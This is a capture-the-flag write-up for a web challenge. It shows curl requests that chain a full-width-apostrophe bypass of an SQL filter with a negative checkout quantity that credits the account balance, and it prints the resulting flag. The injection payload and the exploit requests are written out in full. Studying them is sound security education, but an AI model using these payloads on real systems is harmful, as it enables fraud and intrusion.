# Nightly Audit — CTF Writeup

## Challenge Overview

The challenge exposes a JSON API where the goal is to obtain the flag from `/api/flag`.

The intended solution involves two application flaws:

1. A **Unicode normalization / validation bypass** in the profile endpoint.
2. A **negative quantity business-logic flaw** in checkout that allows the account balance to be increased.

---

## 1. Create an Account

Create a normal user:

```bash
curl -s -X POST \
  https://ch05-sqli.ip-167-235-30-42.swiftwave.xyz/api/signup \
  -H 'Content-Type: application/json' \
  -d '{"username":"bypass_user","password":"BypassPass123!"}'
```

---

## 2. Identify the SQL Filter

The profile endpoint expects:

```json
{"display_name":"..."}
```

A conventional SQL injection payload using ASCII apostrophes is rejected:

```text
' OR '1'='1
```

The application responds with:

```json
{"error":"display_name contains disallowed characters"}
```

---

## 3. Unicode Normalization Bypass

Use the full-width apostrophe `＇` (U+FF07):

```text
＇ OR ＇1＇=＇1
```

Send:

```bash
curl -s -X POST \
  https://ch05-sqli.ip-167-235-30-42.swiftwave.xyz/api/profile \
  -H 'Content-Type: application/json' \
  -d '{"display_name":"＇ OR ＇1＇=＇1"}'
```

The application accepts it and returns:

```json
{"display_name":"' OR '1'='1"}
```

### Why it works

The vulnerable processing order is effectively:

```text
User input
    ↓
ASCII-character validation
    ↓
Unicode compatibility normalization
    ↓
Application/storage
```

The filter sees the full-width apostrophe, not the ASCII apostrophe. Unicode normalization later converts:

```text
＇ → '
```

Therefore the application validates one representation but subsequently processes another.

This is a **Unicode normalization / validation mismatch**.

---

## 4. Exploit Negative Checkout Quantity

The checkout endpoint accepts:

```json
{"quantity":1}
```

A positive quantity costs 500 cents per unit.

Negative quantities are not rejected. For example:

```bash
curl -s -X POST \
  https://ch05-sqli.ip-167-235-30-42.swiftwave.xyz/api/checkout \
  -H 'Content-Type: application/json' \
  -d '{"quantity":-10}'
```

The observed balances were:

| Request | Observed balance |
|---|---:|
| `{"quantity":-1}` | `0` cents |
| `{"quantity":-10}` | `5,000` cents |
| `{"quantity":-20,000}` | `10,005,000` cents |

The effective calculation is:

```text
balance -= quantity × 500
```

Thus a negative quantity credits the account.

---

## 5. Reach the Required Balance

The flag endpoint requires at least:

```text
10,000,000 cents
```

Use:

```bash
curl -s -X POST \
  https://ch05-sqli.ip-167-235-30-42.swiftwave.xyz/api/checkout \
  -H 'Content-Type: application/json' \
  -d '{"quantity":-20000}'
```

This produces a balance of:

```text
10,005,000 cents
```

---

## 6. Retrieve the Flag

```bash
curl -s \
  https://ch05-sqli.ip-167-235-30-42.swiftwave.xyz/api/flag
```

Response:

```json
{"flag":"FLAG{jr3g8a_91bq4v_t8t917}"}
```

## Flag

```text
FLAG{jr3g8a_91bq4v_t8t917}
```

---

## Vulnerabilities

### Unicode normalization vulnerability

An ASCII-only filter is applied before Unicode compatibility normalization, allowing:

```text
＇ → '
```

to bypass the validation.

### Negative quantity vulnerability

The checkout endpoint does not enforce a positive quantity. A negative value reverses the intended debit and increases the account balance.

---

## Exploit Chain

```text
Create normal account
        ↓
Unicode apostrophe bypass
        ↓
Profile accepts normalized SQL syntax
        ↓
Negative checkout quantity
        ↓
Balance > 10,000,000 cents
        ↓
GET /api/flag
        ↓
FLAG{jr3g8a_91bq4v_t8t917}
```

> **Note:** The supplied solution indicates that the negative checkout flaw is sufficient to satisfy the final balance requirement. The Unicode issue demonstrates the intended normalization/validation vulnerability but is not required for the final flag retrieval.

---

## Final Flag

`FLAG{jr3g8a_91bq4v_t8t917}`
